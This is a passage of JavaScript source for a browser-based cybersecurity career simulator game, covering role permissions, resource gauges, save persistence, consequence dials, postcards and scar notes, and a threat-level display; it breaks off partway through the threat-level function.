/*
 * sim.js — Cybersecurity Career Simulator (prototype, role-based)
 *
 * A clean REBUILD of the investigation flow as a role-based career simulator.
 * It lives ALONGSIDE the existing Operations Center home (#opsCenter) and the
 * legacy experimental interiors (holotable / console / lab) WITHOUT replacing
 * them. Career missions open their own four-panel "Operating Center" screen
 * (#careerOps) via a window bridge, mirroring the lab.js bridge pattern.
 *
 * Architecture (future-ready by design — see attached career-sim master spec):
 *   - ROLE engine        : 7-role ladder as config; only Cybersecurity Intern
 *                          is active. Authority booleans + allowedActions gate
 *                          what the player may do; future roles unlock more.
 *   - RESOURCE engine    : six organizational resources, always visible in a
 *                          top resource bar, persisted in localStorage.
 *   - INVESTIGATION engine (P2) : terminal (ls/cat/less) reveals evidence;
 *                          reward is investigation quality, not command usage.
 *   - DECISION engine (P3)      : every decision moves >=3 resources + flags.
 *   - CONSEQUENCE engine (P3)   : Immediate / Business / Resource / Future.
 *   - RECOMMENDATION engine (P3): Approved / Denied / Deferred / Partial.
 *   - CAREER engine (P4)        : rank derived; mission report + carry-forward.
 *
 * The engine is GENERIC: all mission content lives in CAREER_MISSIONS[id] and is
 * selected into SIM.def on open. Adding a mission = adding a dataset, not code.
 *
 * SHIPPING INTEGRATION (de-prototyped):
 *   - Career state is read/written through the host bridges window.echCareerLoad /
 *     window.echCareerSave (defined in script.js). Those persist it inside the
 *     shipping save "ech.progress.v1" under the additive `career` key, via the
 *     saveProgress() chokepoint (which also enqueues the best-effort Supabase
 *     mirror). CAREER_STORE_KEY ('ocp.career.v1') is now only a STANDALONE
 *     fallback used when no host bridge is present (prototype / tests).
 *   - No quiz / flashcard / lesson / command-memo engine. No correct=+X scoring.
 */

/* ================================================================== *
 * ROLE ENGINE — 7-role ladder (config only; future-ready)
 * ------------------------------------------------------------------ *
 * Only `cybersecurity_intern` is ACTIVE. Future roles exist purely as
 * configuration so the resource/decision/recommendation engines can later
 * unlock authority without a redesign. Permission booleans + allowedActions
 * are what the Operating Center reads — never a hard-coded role id.
 * ================================================================== */
import {
  activeConditions,
  buildEffectiveDef,
  dynamicDeltaMods,
  mergeDeltas,
  continuityLines,
  outcomeNotes,
  supervisorMemoryLines,
  upsertCompanyHistory,
  companyTimeline,
  performanceReview,
  promotionDecision,
} from './career-dynamic.js';

import {
  CONSEQUENCE_DIALS,
  SCAR_TEXT,
  freshConsequenceState,
  deptFor,
  accrueDecision,
  pickPostcards as pickPostcardsCore,
  tradeoffBand,
} from './consequence-core.js';

import {
  evaluateHypothesis,
  calibrationValid,
  calibrationLabel,
  calibrationCallback,
  CALIB_MAX_RATIONALE,
  twoVoiceValidChoice,
  twoVoiceReconcile,
  trailEmit,
  trailMatches,
  trailActionValid,
  selectRecap,
  sarahBet,
  sarahCalibration,
  sarahTwoVoice,
  sarahTrails,
} from './sarah-sparring-core.js';

const CAREER_ROLES = [
  {
    id: 'cybersecurity_intern',
    title: 'Cybersecurity Intern',
    department: 'Security Operations',
    authorityLevel: 1,
    active: true,
    canViewBudget: true,
    canAffectBudget: true,
    canRecommend: true,
    canEscalate: true,
    canRequestBudget: false,
    canApproveBudget: false,
    canPurchaseTools: false,
    canChangePolicy: false,
    canHireConsultants: false,
    canEngageExecutives: false,
    allowedActions: ['investigate', 'classify', 'recommend', 'escalate', 'document'],
  },
  { id: 'junior_soc_analyst',   title: 'Junior SOC Analyst',           department: 'Security Operations', authorityLevel: 2, active: false,
    canViewBudget: true, canAffectBudget: true, canRecommend: true, canEscalate: true,
    canRequestBudget: true, canApproveBudget: false, canPurchaseTools: false, canChangePolicy: false,
    canHireConsultants: false, canEngageExecutives: false,
    allowedActions: ['investigate', 'classify', 'recommend', 'escalate', 'document', 'contain'] },
  { id: 'soc_analyst',          title: 'SOC Analyst',                  department: 'Security Operations', authorityLevel: 3, active: false,
    canViewBudget: true, canAffectBudget: true, canRecommend: true, canEscalate: true,
    canRequestBudget: true, canApproveBudget: false, canPurchaseTools: false, canChangePolicy: false,
    canHireConsultants: false, canEngageExecutives: false,
    allowedActions: ['investigate', 'classify', 'recommend', 'escalate', 'document', 'contain', 'correlate'] },
  { id: 'senior_security_analyst', title: 'Senior Security Analyst',   department: 'Security Operations', authorityLevel: 4, active: false,
    canViewBudget: true, canAffectBudget: true, canRecommend: true, canEscalate: true,
    canRequestBudget: true, canApproveBudget: false, canPurchaseTools: true, canChangePolicy: false,
    canHireConsultants: false, canEngageExecutives: false,
    allowedActions: ['investigate', 'classify', 'recommend', 'escalate', 'document', 'contain', 'correlate', 'mentor'] },
  { id: 'security_manager',     title: 'Security Manager',             department: 'Security Leadership',  authorityLevel: 5, active: false,
    canViewBudget: true, canAffectBudget: true, canRecommend: true, canEscalate: true,
    canRequestBudget: true, canApproveBudget: true, canPurchaseTools: true, canChangePolicy: true,
    canHireConsultants: true, canEngageExecutives: false,
    allowedActions: ['investigate', 'recommend', 'escalate', 'approve', 'purchase', 'set_policy', 'manage_team'] },
  { id: 'director_cybersecurity', title: 'Director of Cybersecurity',  department: 'Security Leadership',  authorityLevel: 6, active: false,
    canViewBudget: true, canAffectBudget: true, canRecommend: true, canEscalate: true,
    canRequestBudget: true, canApproveBudget: true, canPurchaseTools: true, canChangePolicy: true,
    canHireConsultants: true, canEngageExecutives: true,
    allowedActions: ['approve', 'purchase', 'set_policy', 'manage_program', 'engage_executives', 'manage_vendors'] },
  { id: 'ciso',                 title: 'Chief Information Security Officer', department: 'Executive',      authorityLevel: 7, active: false,
    canViewBudget: true, canAffectBudget: true, canRecommend: true, canEscalate: true,
    canRequestBudget: true, canApproveBudget: true, canPurchaseTools: true, canChangePolicy: true,
    canHireConsultants: true, canEngageExecutives: true,
    allowedActions: ['set_strategy', 'approve', 'engage_board', 'manage_program', 'engage_executives', 'manage_vendors'] },
];

function roleById(id) { return CAREER_ROLES.find(r => r.id === id) || CAREER_ROLES[0]; }
function activeRole() { return roleById(CAREER.currentRole); }

const ACTION_LABELS = {
  investigate: 'Investigate', classify: 'Classify', recommend: 'Recommend',
  escalate: 'Escalate', document: 'Document', contain: 'Contain',
  correlate: 'Correlate', mentor: 'Mentor', approve: 'Approve',
  purchase: 'Purchase', set_policy: 'Set Policy', manage_team: 'Manage Team',
  manage_program: 'Manage Program', engage_executives: 'Engage Executives',
  manage_vendors: 'Manage Vendors', set_strategy: 'Set Strategy',
  engage_board: 'Engage Board',
};
function actionLabel(a) { return ACTION_LABELS[a] || a; }

/* ================================================================== *
 * RESOURCE ENGINE — six organizational resources + persistence
 * ================================================================== */
const RESOURCE_DEFS = [
  { key: 'securityPosture',    label: 'Security Posture',    kind: 'pct',   higherBetter: true  },
  { key: 'organizationBudget', label: 'Organization Budget', kind: 'money', higherBetter: true  },
  { key: 'executiveTrust',     label: 'Executive Trust',     kind: 'pct',   higherBetter: true  },
  { key: 'complianceExposure', label: 'Compliance Exposure', kind: 'pct',   higherBetter: false },
  { key: 'careerReputation',   label: 'Career Reputation',   kind: 'pct',   higherBetter: true  },
  { key: 'businessContinuity', label: 'Business Continuity', kind: 'pct',   higherBetter: true  },
];

const CAREER_SCHEMA_VERSION = 2;

// Starting standing is deliberately mid-range (not pinned high) so the three
// headline gauges have room to climb on strong play AND fall on weak play —
// a fresh analyst starts in "Caution" on Threat Defense / Leadership Trust and
// earns their way to "Strong". complianceExposure starts above its floor so its
// 30% slice of Threat Defense can actually move both ways. (Only affects new /
// reset saves — loadCareerState preserves an existing player's resources.)
const CAREER_DEFAULTS = {
  schemaVersion: CAREER_SCHEMA_VERSION,
  securityPosture: 60,
  organizationBudget: 50000,
  executiveTrust: 60,
  complianceExposure: 25,
  careerReputation: 0,
  businessContinuity: 75,
  currentRole: 'cybersecurity_intern',
  currentRank: 'Cybersecurity Intern',
  evidenceView: 'beginner',   // 'beginner' | 'analyst' — presentation only
  missionFlags: {},
  completedMissions: [],
  companyHistory: {},         // {missionId: outcome record} — the company timeline
  // Consequence Emotion Loop (Task #120) — display/state-only diegetic layer.
  // Both are append-style queues persisted through the save chokepoint; they
  // never feed scoring/confidence and default empty (schema v1 blobs lack them).
  consequencePostcards: [],   // [{id, kind, dept, missionId, of, le, text, ts, shown}]
  scarNotes: [],              // [{id, dept, missionId, text, ts}] — persistent CyberCorp memory
  updatedAt: null,            // ms epoch of last persisted save (stamped on save)
};

const CAREER_STORE_KEY = 'ocp.career.v1';

/* Persistent career state. Authoritative for the resource bar and the sim.
 * Kept fully separate from the legacy getCareerState() reads in oc.js. */
let CAREER = loadCareerState();

function clampResource(key, val) {
  const def = RESOURCE_DEFS.find(d => d.key === key);
  let n = Number(val);
  if (!Number.isFinite(n)) n = CAREER_DEFAULTS[key];
  if (def && def.kind === 'money') return Math.max(0, Math.round(n));
  return Math.max(0, Math.min(100, Math.round(n)));
}

function loadCareerState() {
  const base = { ...CAREER_DEFAULTS, missionFlags: {}, completedMissions: [], companyHistory: {}, consequencePostcards: [], scarNotes: [] };
  try {
    // Shipping integration: career state lives in ech.progress.v1 (progress.career),
    // read through the host bridge. Standalone (no host) falls back to its own key.
    let saved;
    if (typeof window !== 'undefined' && typeof window.echCareerLoad === 'function') {
      saved = window.echCareerLoad();
    } else {
      const raw = localStorage.getItem(CAREER_STORE_KEY);
      saved = raw ? JSON.parse(raw) : null;
    }
    if (!saved || typeof saved !== 'object') return base;
    RESOURCE_DEFS.forEach(d => {
      base[d.key] = clampResource(d.key, saved[d.key] != null ? saved[d.key] : base[d.key]);
    });
    if (typeof saved.currentRole === 'string' && CAREER_ROLES.some(r => r.id === saved.currentRole)) {
      base.currentRole = saved.currentRole;
    }
    base.currentRank = roleById(base.currentRole).title;
    if (saved.evidenceView === 'analyst' || saved.evidenceView === 'beginner') {
      base.evidenceView = saved.evidenceView;
    }
    if (saved.missionFlags && typeof saved.missionFlags === 'object') {
      base.missionFlags = { ...saved.missionFlags };
    }
    if (Array.isArray(saved.completedMissions)) {
      base.completedMissions = saved.completedMissions.filter(m => typeof m === 'string');
    }
    if (saved.companyHistory && typeof saved.companyHistory === 'object') {
      base.companyHistory = { ...saved.companyHistory };
    }
    // Consequence Emotion Loop (Task #120) — restore the persisted postcard queue
    // + scar memory. Schema v1 blobs lack both keys, so they fall back to [].
    if (Array.isArray(saved.consequencePostcards)) {
      base.consequencePostcards = saved.consequencePostcards.filter(p => p && typeof p === 'object');
    }
    if (Array.isArray(saved.scarNotes)) {
      base.scarNotes = saved.scarNotes.filter(s => s && typeof s === 'object');
    }
    // schemaVersion stays at the current code version (any future migration would
    // branch on saved.schemaVersion here). Preserve the last-saved timestamp.
    if (typeof saved.updatedAt === 'number') base.updatedAt = saved.updatedAt;
    return base;
  } catch (_) {
    return base;
  }
}

function saveCareerState() {
  try {
    // Stamp schema version + save time so the persisted blob is self-describing
    // (future migrations branch on schemaVersion in loadCareerState).
    CAREER.schemaVersion = CAREER_SCHEMA_VERSION;
    CAREER.updatedAt = Date.now();
    // Shipping integration: persist ONLY through the host saveProgress() chokepoint
    // (it also enqueues the best-effort Supabase mirror). Standalone falls back to
    // career-sim's own localStorage key.
    if (typeof window !== 'undefined' && typeof window.echCareerSave === 'function') {
      window.echCareerSave(CAREER);
      return;
    }
    localStorage.setItem(CAREER_STORE_KEY, JSON.stringify(CAREER));
  } catch (_) { /* storage unavailable — stay in-memory, never throw */ }
}

function resetCareerStateInMemory() {
  CAREER = { ...CAREER_DEFAULTS, missionFlags: {}, completedMissions: [], companyHistory: {}, consequencePostcards: [], scarNotes: [] };
  renderResourceBar();
}
function resetCareerState() {
  resetCareerStateInMemory();
  saveCareerState();
}
// Host "Clear Progress" resets the in-memory career state WITHOUT persisting
// (the host wipes ech.progress.v1 separately and leaves storage empty).
if (typeof window !== 'undefined') window.echCareerResetInMemory = resetCareerStateInMemory;

/* Apply a map of resource deltas (e.g. {securityPosture:-25, executiveTrust:-20}),
 * clamp, persist, and refresh the bar. Returns the before/after for each key so
 * the consequence engine can show exact changes. */
function applyResourceDeltas(deltas) {
  const changes = [];
  Object.keys(deltas || {}).forEach(key => {
    if (!RESOURCE_DEFS.some(d => d.key === key)) return;
    const before = CAREER[key];
    const after = clampResource(key, before + Number(deltas[key] || 0));
    CAREER[key] = after;
    changes.push({ key, before, after, requested: Number(deltas[key] || 0) });
  });
  saveCareerState();
  renderResourceBar();
  return changes;
}

function setMissionFlag(flag, value = true) {
  if (!flag) return;
  CAREER.missionFlags[flag] = value;
  saveCareerState();
}

/* ================================================================== *
 * CONSEQUENCE EMOTION LOOP (Task #120) — diegetic, display/state-only
 * ------------------------------------------------------------------ *
 * Four cooperating systems, ALL additive and reversible, that turn the
 * existing decision outcomes into felt organizational ripples:
 *   (A) Company Health Dials  — two transient 0-3 HUD meters
 *   (B) Consequence Postcards — short in-world notes surfaced next session
 *   (C) Scar Notes            — persistent CyberCorp memory of extreme calls
 *   (D) Micro-Tradeoffs       — one tiny reversible debrief texture
 *
 * HARD INVARIANTS (do not break):
 *  - Nothing here changes scoring, confidence, or the judgment engine.
 *    setDiscoveryJudgment stays the sole graded write. We only READ the
 *    final decision id (present in all four missions).
 *  - Dials react to the decision's OPERATIONAL POSTURE — the inherent
 *    disruptiveness of the action — NEVER to whether the answer was keyed
 *    correct. A decisive-but-correct containment raises Friction because it
 *    genuinely disrupts ops; an under-reaction raises Exposure because it
 *    genuinely leaves risk open. Verdict/correctness is deliberately NOT an
 *    input to the dials, so the loop can never leak the answer.
 *  - With every flag off the game plays IDENTICALLY (T7 regression).
 * ================================================================== */

// Master + per-system switches. All on by default (the feature ships live);
// flipping `enabled` to false — or any sub-flag — removes that system's every
// visible/persisted effect, leaving the base game untouched.
const CONSEQUENCE_FLAGS = {
  enabled: true,        // master switch
  dials: true,          // (A) Company Health Dials + toasts
  postcards: true,      // (B) Consequence Postcards
  scars: true,          // (C) Scar Notes
  microTradeoff: true,  // (D) Micro-Tradeoffs
};
function consequenceOn(sub) {
  return !!(CONSEQUENCE_FLAGS.enabled && (sub ? CONSEQUENCE_FLAGS[sub] : true));
}

// The posture map, keyword fallback, clamping router (routePosture), the
// department-flavor map, the dial-accumulation step (accrueDecision), the dial
// definitions, the postcard bank + picker, the scar copy, and the tradeoff-band
// selector are PURE and live in ./consequence-core.js so they can run under node
// (mirroring career-dynamic.js). career-sim.js keeps all DOM/state here and calls
// into that core. `consequenceDept` is a thin SIM-bound wrapper over `deptFor`.
function consequenceDept(kind) {
  return deptFor(SIM.missionId, kind);
}

// Non-blocking telemetry — in-memory ring + console.debug mirror. Never persists,
// never throws (mirrors the notebook markupLog pattern).
const CONSEQUENCE_LOG = [];
function consequenceLog(event, data) {
  try {
    CONSEQUENCE_LOG.push({ t: Date.now(), event, ...(data || {}) });
    if (CONSEQUENCE_LOG.length > 100) CONSEQUENCE_LOG.shift();
    if (typeof console !== 'undefined' && console.debug) console.debug('[consequence]', event, data || '');
  } catch (_) { /* telemetry is best-effort */ }
}

/* ---- Toast bridge (cross-module) -------------------------------------------
 * career-sim.js is its own ES module; the host (script.js) owns the event-toast
 * system and exposes window.echShowToast. Friction reads "info" (operational),
 * Exposure reads "warning" (risk). Standalone (no host) silently no-ops. */
function consequenceToast(title, message, kind) {
  if (!consequenceOn('dials')) return;
  try {
    if (typeof window !== 'undefined' && typeof window.echShowToast === 'function') {
      // Posture tone (never correctness): friction = info (operational), exposure =
      // warning (risk), measured/calm = blueteam (steady, neutral — never red, and
      // never a "correct"-implying green).
      const tone = kind === 'of' ? 'info' : kind === 'le' ? 'warning' : 'blueteam';
      window.echShowToast(title, message, tone, { duration: 6000 });
    }
  } catch (_) { /* toast is best-effort, never block the decision */ }
}

/* ---- (A) Company Health Dials --------------------------------------------- */
// Two mission-scoped meters (CONSEQUENCE_DIALS) + freshConsequenceState live in
// consequence-core.js. SIM.consequence is transient (reset every open in
// openCareerMission), so dials never carry across missions.
// Plain-language tooltips so a player understands the HUD even at 0/0
// (presentation only — the core stays pure).
const DIAL_HELP = {
  of: 'Operational Friction — how much disruption your calls created for IT & operations.',
  le: 'Latent Exposure — how much risk your calls left open for other teams to chase.',
};

function renderConsequenceDials(opts) {
  const host = document.getElementById('simDials');
  if (!host) return;
  if (!consequenceOn('dials')) { host.innerHTML = ''; host.hidden = true; return; }
  // Simplified Mission 1: keep the Company Health dials hidden until the player
  // has made a call — there are no consequences to show before a decision. Gated
  // on the per-mission flag, so M2-M4 still show the dials from mission open.
  if (simpleUiMode() && !SIM.decision) { host.innerHTML = ''; host.hidden = true; return; }
  host.hidden = false;
  const pulse = (opts && Array.isArray(opts.pulse)) ? opts.pulse : [];
  const s = SIM.consequence || freshConsequenceState();
  const dials = CONSEQUENCE_DIALS.map(d => {
    const v = Math.max(0, Math.min(3, s[d.key] | 0));
    const segs = [0, 1, 2].map(i =>
      `<span class="sim-dial-seg${i < v ? ' sim-dial-seg--on' : ''} sim-dial-seg--${d.key}" aria-hidden="true"></span>`
    ).join('');
    const help = DIAL_HELP[d.key] || d.label;
    const isPulse = pulse.indexOf(d.key) !== -1;
    return `<div class="sim-dial sim-dial--${d.key}${v >= 3 ? ' sim-dial--peak' : ''}${isPulse ? ' sim-dial--pulse' : ''}" role="img" aria-label="${d.label}: ${v} of 3" title="${help}">
        <span class="sim-dial-name">${d.short}</span>
        <span class="sim-dial-track">${segs}</span>
        <span class="sim-dial-val" aria-hidden="true">${v}/3</span>
      </div>`;
  }).join('');
  // A leading group label makes the meters legible/labelled even at 0/0, so the
  // loop reads as a system the player is part of — not an unexplained widget.
  host.innerHTML = `<span class="sim-dials-label" title="How your decisions ripple through CyberCorp. These reflect the impact of your calls — not a score.">COMPANY HEALTH</span>${dials}`;
}

/* ---- (B) Consequence Postcards -------------------------------------------- */
// The template bank (POSTCARD_BANK) + band picker (pickPostcards) live in
// consequence-core.js; they choose by posture band and describe organizational
// ripples — never the correctness of the answer. queuePostcards persists them.
function queuePostcards(of, le) {
  if (!consequenceOn('postcards')) return false;
  if (!Array.isArray(CAREER.consequencePostcards)) CAREER.consequencePostcards = [];
  const cards = pickPostcardsCore(SIM.missionId, of, le);
  if (!cards.length) return false;
  cards.forEach(c => CAREER.consequencePostcards.push(c));
  // Bound the queue so replays never grow it without limit.
  if (CAREER.consequencePostcards.length > 12) {
    CAREER.consequencePostcards = CAREER.consequencePostcards.slice(-12);
  }
  consequenceLog('postcards.queued', { count: cards.length, of, le, mission: SIM.missionId });
  return true;
}

/* ---- (C) Scar Notes ------------------------------------------------------- */
// Persistent CyberCorp memory of an EXTREME call (a dial peaked at 3/3). Keyed
// per mission+dial so a replay updates rather than duplicates. Display-only.
// SCAR_TEXT (the per-dial copy) lives in consequence-core.js.
function appendScar(dial) {
  if (!consequenceOn('scars')) return false;
  if (!Array.isArray(CAREER.scarNotes)) CAREER.scarNotes = [];
  const id = `${SIM.missionId}:${dial}`;
  if (CAREER.scarNotes.some(s => s && s.id === id)) return false; // idempotent across replays
  const dept = consequenceDept(dial);
  CAREER.scarNotes.push({ id, dial, dept, missionId: SIM.missionId, text: SCAR_TEXT[dial](dept), ts: Date.now() });
  if (CAREER.scarNotes.length > 20) CAREER.scarNotes = CAREER.scarNotes.slice(-20);
  consequenceLog('scar.appended', { dial, mission: SIM.missionId });
  return true;
}

/* ---- Router entry — called from chooseAction / submitRecommendation -------- *
 * Reads the just-recorded decision id, maps it to posture, ticks the dials with
 * per-segment toasts, queues postcards, records any peak scar, and arms the
 * debrief micro-tradeoff. Persists through saveCareerState (also re-saved by
 * finalizeMission). Never throws — wrapped so a fault can't break the decision. */
function applyDecisionConsequence(actionId) {
  if (!consequenceOn()) return;
  try {
    if (!SIM.consequence) SIM.consequence = freshConsequenceState();
    const before = { of: SIM.consequence.of | 0, le: SIM.consequence.le | 0 };
    const { delta, after } = accrueDecision(before, actionId);
    SIM.consequence.of = after.of;
    SIM.consequence.le = after.le;
    consequenceLog('decision', { actionId, of: SIM.consequence.of, le: SIM.consequence.le, mission: SIM.missionId });

    // Dials + per-dial toast (one per dial that moved — concise, not spammy).
    let persistedChange = false;
    const moved = [];
    CONSEQUENCE_DIALS.forEach(d => {
      const now = SIM.consequence[d.key] | 0;
      if (now > before[d.key]) {
        moved.push(d.key);
        const dept = consequenceDept(d.key);
        consequenceToast(`${d.label} ↑ ${now}/3`, `${dept}: ${d.toast}`, d.key);
        if (now >= 3 && appendScar(d.key)) persistedChange = true; // (C) extreme call -> persistent scar
      }
    });
    // Classify the decision by its POSTURE (never correctness). A zero-posture call
    // is a genuinely measured response. A NONZERO posture that moved no meter means
    // its dial is already saturated at 3/3 — that is sustained strain, not "measured",
    // so it must NOT borrow the calm copy. Either way EVERY decision produces a cue.
    const measured = (delta.of | 0) === 0 && (delta.le | 0) === 0;
    const pulse = moved.slice();
    if (!moved.length && !measured) {
      // Forceful/risky call against an already-capped dial: surface the dominant
      // posture dial as sustained pressure (posture-keyed colour, not the calm one).
      const k = (delta.of | 0) >= (delta.le | 0) ? 'of' : 'le';
      const d = CONSEQUENCE_DIALS.find(x => x.key === k) || CONSEQUENCE_DIALS[0];
      pulse.push(k);
      consequenceToast(`${d.label} sustained at 3/3`, `${consequenceDept(k)}: already at the ceiling — this call keeps the pressure on, with no room left to climb.`, k);
    }
    // Render the meters, pulsing those that moved (or the saturated one) so the
    // change is impossible to miss (pulse is presentation-only — no state in core).
    renderConsequenceDials({ pulse });
    // A measured call that shifts neither meter still earns a visible, posture-based
    // acknowledgement (derived ONLY from zero posture — never from correctness), so
    // EVERY decision produces a felt ripple, not just forceful/neglectful ones.
    if (!moved.length && measured) {
      consequenceToast('Measured call — minimal ripple', 'A balanced response: no operational friction added, and nothing left open for other teams.', 'calm');
    }

    // (B) postcards for the next session / Ops Center return.
    if (queuePostcards(SIM.consequence.of, SIM.consequence.le)) persistedChange = true;
    // Only persist when a postcard/scar actually mutated, so with those subfeatures
    // off (or nothing queued) the stored blob stays byte-identical to baseline.
    if (persistedChange) saveCareerState();
  } catch (_) { /* consequence layer is best-effort; never break the decision */ }
}

/* ---- (D) Micro-Tradeoff (debrief texture) --------------------------------- *
 * Exactly one tiny, reversible texture per mission, chosen by the dominant dial:
 *   OF-dominant -> an additive "manager sign-off logged" banner (one Acknowledge
 *     click; hides nothing; RETURN always works).
 *   LE-dominant -> a convenience evidence-summary shortcut is WITHHELD and
 *     replaced by a muted deferral note (full evidence stays in the Evidence
 *     panel, always reachable). Never blocks the critical path or hides evidence.
 * Returned as HTML appended into the debrief; the Ack button toggles via the
 * #careerOps delegated click handler. */
function consequenceTradeoffHtml() {
  if (!consequenceOn('microTradeoff')) return '';
  const s = SIM.consequence || freshConsequenceState();
  const of = s.of | 0, le = s.le | 0;
  const band = tradeoffBand(of, le);
  if (band === 'of') {
    const dept = consequenceDept('of');
    return `<div class="sim-tradeoff sim-tradeoff--of" data-tradeoff>
        <div class="sim-tradeoff-head">⚠ OPERATIONS IMPACT — ${dept} sign-off logged</div>
        <p class="sim-tradeoff-body">Your response disrupted active operations, so ${dept} logged an approval checkpoint before changes proceeded. You can still return to the Operations Center at any time.</p>
        <button type="button" class="sim-tradeoff-ack" data-consequence-ack="of" aria-pressed="false">Acknowledge sign-off</button>
      </div>`;
  }
  if (band === 'le') {
    const dept = consequenceDept('le');
    return `<div class="sim-tradeoff sim-tradeoff--le" data-tradeoff>
        <div class="sim-tradeoff-head">◷ EXPOSURE BACKLOG — quick summary deferred</div>
        <p class="sim-tradeoff-body">An open exposure was left for follow-up, so ${dept} put the one-click evidence summary behind triage. The full evidence remains in the Evidence panel.</p>
      </div>`;
  }
  // Calm / measured: not a tradeoff, but still a visible, in-world consequence — a
  // quiet, steady shift (posture-derived: neither meter moved, never correctness).
  // The always-present Evidence shortcut stays as a secondary affordance.
  const calmDept = consequenceDept('of');
  return `<div class="sim-tradeoff sim-tradeoff--calm" data-tradeoff>
      <div class="sim-tradeoff-head">▪ MEASURED RESPONSE — a quiet shift</div>
      <p class="sim-tradeoff-body">Your call added no operational friction and left nothing open for follow-up. ${calmDept} reports a steady queue — no ripples logged this round.</p>
      <button type="button" class="sim-tradeoff-chip" data-ev-focus>▸ Open evidence summary</button>
    </div>`;
}

/* ---- Home surface — postcards (once) + scar memory (persistent) ------------ *
 * Rendered into #echConsequenceInbox in the Operations Center right column.
 * Called from the host's renderOperationsCenter (every home show, incl. boot).
 * Postcards display up to two unshown notes then mark them shown; scars always
 * list. Display-only — reading state, never writing scoring/confidence. */
function renderHomeConsequences() {
  const host = document.getElementById('echConsequenceInbox');
  if (!host) return;
  if (!consequenceOn()) { host.innerHTML = ''; host.hidden = true; return; }

  let html = '';

  // (B) Postcards — surface up to two unshown, then persist them as shown.
  if (consequenceOn('postcards') && Array.isArray(CAREER.consequencePostcards)) {
    const unshown = CAREER.consequencePostcards.filter(p => p && !p.shown);
    const show = unshown.slice(0, 2);
    if (show.length) {
      html += `<div class="oc-conseq-block">
        <div class="oc-conseq-head"><span class="oc-conseq-icon" aria-hidden="true">✉</span><span>FIELD REPORTS</span></div>
        <ul class="oc-conseq-list" aria-label="Field reports from other teams">${
          show.map(p => `<li class="oc-postcard oc-postcard--${p.kind}">
            <span class="oc-postcard-dept">${p.dept}</span>
            <span class="oc-postcard-text">${p.text}</span></li>`).join('')
        }</ul></div>`;
      show.forEach(p => { p.shown = true; });
      saveCareerState();
      consequenceLog('postcards.shown', { count: show.length });
    }
  }

  // (C) Scar memory — persistent, always listed (compact, dept-tagged).
  if (consequenceOn('scars') && Array.isArray(CAREER.scarNotes) && CAREER.scarNotes.length) {
    html += `<div class="oc-conseq-block oc-conseq-block--scars">
      <div class="oc-conseq-head"><span class="oc-conseq-icon" aria-hidden="true">⌖</span><span>CASE SCARS</span></div>
      <ul class="oc-conseq-list" aria-label="Lasting marks from past cases">${
        CAREER.scarNotes.slice(-5).map(s => `<li class="oc-scar oc-scar--${s.dial}">
          <span class="oc-scar-dept">${s.dept}</span>
          <span class="oc-scar-text">${s.text}</span></li>`).join('')
      }</ul></div>`;
  }

  // Discoverability: a new analyst (or one between cases) should still see that
  // decisions echo here. Render-only placeholder — NO persisted state and NO
  // saveCareerState(), so the stored blob stays byte-identical to baseline.
  if (!html) {
    html = `<div class="oc-conseq-block oc-conseq-block--empty">
      <div class="oc-conseq-head"><span class="oc-conseq-icon" aria-hidden="true">✉</span><span>FIELD REPORTS</span></div>
      <p class="oc-conseq-empty">Field reports and case scars from your decisions surface here — other teams react to the calls you make in the field.</p>
    </div>`;
  }

  host.innerHTML = html;
  host.hidden = !html;
}

/* ================================================================== *
 * PERFORMANCE GAUGES — composite display layer over the six resources
 * ------------------------------------------------------------------ *
 * The always-visible bar shows three player-facing red->yellow->green
 * pointer gauges instead of six raw stats. Each gauge rolls the relevant
 * underlying resources into a single 0..100 "position": pointer RIGHT =
 * good judgment / healthy business, pointer LEFT = poor judgment / harm.
 * PRESENTATION ONLY — derived from live CAREER state, mutates nothing, and
 * leaves the resource model + scoring (recommendation verdict, Mission 4
 * review) untouched. The pointer animates as decisions move the resources.
 * ================================================================== */
const GAUGE_STATE = { good: 'Strong', warn: 'Caution', low: 'At Risk' };

function gaugeTone(pos) {
  return pos >= 70 ? 'good' : pos >= 40 ? 'warn' : 'low';
}

function careerGauges() {
  const c = CAREER;
  const clamp01 = n => Math.max(0, Math.min(100, n));
  // Budget measured against the org's healthy starting reserve (spending pulls left).
  const budgetNorm = clamp01((c.organizationBudget / CAREER_DEFAULTS.organizationBudget) * 100);
  const gauges = [
    {
      key: 'threatDefense',
      label: 'Threat Defense',
      desc: 'Did your calls actually stop the threat?',
      // Security posture, reinforced by keeping compliance exposure low (inverted).
      pos: clamp01(0.7 * c.securityPosture + 0.3 * (100 - c.complianceExposure)),
    },
    {
      key: 'businessImpact',
      label: 'Business Impact',
      desc: 'Did you keep the business running while you responded?',
      pos: clamp01(0.65 * c.businessContinuity + 0.35 * budgetNorm),
    },
    {
      key: 'leadershipTrust',
      label: 'Leadership Trust',
      desc: 'Does leadership trust your judgment?',
      // Executive trust is the floor; your earned track record lifts it further.
      pos: clamp01(c.executiveTrust + 0.25 * c.careerReputation),
    },
  ];
  gauges.forEach(g => { g.pos = Math.round(g.pos); g.tone = gaugeTone(g.pos); g.state = GAUGE_STATE[g.tone]; });
  return gauges;
}

/* ================================================================== *
 * THREAT LEVEL — one live danger reading for the OCV2 home header.
 * Presentation-only: derived from real progress (missions resolved)
 * blended with current Threat Defense posture. More contained = lower
 * threat; a collapsing defense pushes it back up. Writes nothing — it
 * only reports the situation the player has already earned.
 * ================================================================== */
const THREAT_LEVELS = {
  normal:   { id: 'normal',   label: 'NORMAL',   tone: 'ok'    },
  guarded:  { id: 'guarded',  label: 'GUARDED',  tone: 'warn'  },
  elevated: { id: 'elevated', label: 'ELEVATED', tone: 'alert' },
  critical: { id: 'critical', label: 'CRITICAL', tone: 'crit'  },
};

function careerThreatLevel(opts) {
  // Resolved/total: prefer the caller's count (the home passes the SAME source
  // the identity panel's "X/N resolved" uses, so the two can never disagree).
  // Fall back to career-sim's own completion array when called standalone.
  const o = opts || {};
  let total, resolved;
  if (Number.isFinite(o.total) && Number.isFinite(o.resolved)) {
    total = o.total > 0 ? o.total : 1;
    resolved = Math.max(0, o.resolved);
  } else {
    const ids = (typeof window !== 'undefined' && Array.isArray(window.CAREER_MISSION_IDS) && window.CAREER_MISSION_IDS.length)
      ? window.CAREER_MISSION_IDS
      : Object.keys(CAREER_MISSIONS);
    total = ids.length || 1;
    resolved = Array.isArray(CAREER.completedMissions) ? CAREER.completedMissions.length : 0;
  }
  const progress = Math.max(0, Math.min(1, resolved / total));            // 0..1, higher = safer
  const td = careerGauges().find(g => g.key === 'threatDefense');
  const defense = td ? td.pos : 0;                                        // 0..100, your defensive posture
  // Containment: how under control the situation is — half from work
  // cleared, half from how strong your defense currently is.
